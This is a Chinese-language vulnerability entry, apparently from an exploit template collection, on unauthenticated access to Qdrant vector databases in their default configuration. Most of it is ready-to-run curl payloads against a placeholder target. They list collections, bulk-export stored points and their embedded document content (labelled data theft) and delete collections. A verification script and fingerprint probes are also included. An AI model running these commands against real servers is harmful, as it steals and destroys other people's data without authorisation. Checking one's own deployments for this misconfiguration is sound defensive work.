---
id: QDRANT-UNACC
title: Qdrant 向量数据库未授权访问漏洞
product: qdrant
vendor: Qdrant
version_affected: "all (default config)"
severity: HIGH
tags: [data_leak, ai, vector_db, 无需认证]
fingerprint: ["Qdrant", "qdrant", "/collections", "/dashboard"]
---

## 漏洞描述

Qdrant向量数据库默认无认证，攻击者可读取/修改/删除所有向量数据，泄露嵌入的敏感文档内容。

## 影响版本

- Qdrant 所有版本（默认配置无认证）

## 前置条件

- 目标 Qdrant 服务端口（默认6333）可从网络访问
- 服务未配置 API Key 认证（默认行为）

## 利用步骤

### 未授权访问

```bash
# 列出所有集合
curl http://target:6333/collections

# 获取集合详情
curl http://target:6333/collections/<name>

# 搜索向量（泄露文档内容）
curl -X POST http://target:6333/collections/<name>/points/scroll \
  -H "Content-Type: application/json" \
  -d '{"limit": 100, "with_payload": true}'
```

### 数据窃取

```bash
# 导出所有数据
curl http://target:6333/collections/<name>/points/scroll \
  -d '{"limit": 9999, "with_payload": true, "with_vectors": false}'
```

### Dashboard

```
http://target:6333/dashboard
```

## Payload

### 列出所有集合

```bash
curl -s http://target:6333/collections
```

### 窃取向量数据（含嵌入文档内容）

```bash
curl -s -X POST http://target:6333/collections/<name>/points/scroll \
  -H "Content-Type: application/json" \
  -d '{"limit": 100, "with_payload": true, "with_vectors": false}'
```

### 删除集合（破坏性操作）

```bash
curl -s -X DELETE http://target:6333/collections/<name>
```

### 访问 Dashboard

```bash
curl -s http://target:6333/dashboard
```

## 验证方法

```bash
# 1. 确认未授权访问：返回集合列表即存在漏洞
curl -s http://target:6333/collections | grep '"collections"'

# 2. 确认数据可被读取：返回 payload 数据即可泄露信息
COLLECTION=$(curl -s http://target:6333/collections | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)
curl -s -X POST "http://target:6333/collections/${COLLECTION}/points/scroll" \
  -H "Content-Type: application/json" \
  -d '{"limit": 1, "with_payload": true}' \
  | grep '"payload"'

# 3. 确认 Dashboard 可访问
curl -s -o /dev/null -w "%{http_code}" http://target:6333/dashboard
```

## 指纹确认

```bash
curl -s http://target:6333/
curl -s http://target:6333/collections
```
